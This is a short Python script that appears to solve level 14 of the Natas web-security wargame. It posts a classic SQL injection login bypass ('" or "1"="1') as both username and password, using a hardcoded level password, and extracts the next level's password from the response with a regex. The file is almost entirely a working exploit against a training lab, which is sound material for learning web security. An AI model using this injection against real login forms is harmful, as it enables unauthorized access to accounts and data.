# -*- coding: utf-8 -*-
from base import get_page, post_page
import re

def natas14():
    username = "natas14"
    password = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"

    data={"username":"test\" or \"1\"=\"1", "password":"test\" or \"1\"=\"1"}
    content = post_page(14, username, password, data)
    password = re.search(r"(?<=The password for natas15 is )\w{32}", content)
    if password is None:
        print("Fail to find password")
        return
    print(password.group(0))

if __name__ == "__main__":
    natas14()